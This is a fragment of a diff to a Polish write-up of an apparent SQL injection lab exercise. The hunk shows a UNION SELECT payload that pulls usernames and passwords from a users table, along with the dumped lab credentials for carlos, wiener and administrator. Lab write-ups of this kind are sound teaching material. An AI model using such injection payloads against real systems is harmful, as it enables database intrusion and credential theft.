@@ -53,12 +53,10 @@ Następnie musimy wyodrebnić z nich nazwy użytkowników i hasła:
 ``` ' UNION SELECT username_yiyraf,password_sgsccz FROM users_ulaacr-- ```
 Dzięki temu uzyskaliśmy zrzut haseł i nazw użytkoników
 ```
-<b1>
 carlos
 	cj1w2piec8pdfjtp2a76
 wiener
 	vib0xw0oz6v4y98074s0
 administrator
 	qo33srs73uxgafa3f08o
-</b1>
 ```
